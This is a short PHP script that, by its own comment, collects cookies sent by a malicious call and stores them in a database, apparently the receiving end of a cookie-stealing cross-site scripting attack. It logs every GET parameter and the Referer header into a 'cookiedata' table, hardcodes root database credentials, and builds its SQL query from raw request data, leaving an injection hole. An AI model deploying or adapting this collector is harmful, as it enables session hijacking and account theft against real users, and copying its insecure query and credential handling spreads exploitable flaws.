<?php

/** get the cookies from malicious user call
store it in a db */

	mysql_connect("localhost", "root", "aaabbb3");
	mysql_select_db("am2_iamgood");

	print_r($_GET);

		$qc = "INSERT INTO cookiedata (ref, cookiedata) VALUES 
			('".$_SERVER["HTTP_REFERER"]."', '".json_encode($_GET)."')";

		$rc = mysql_query($qc);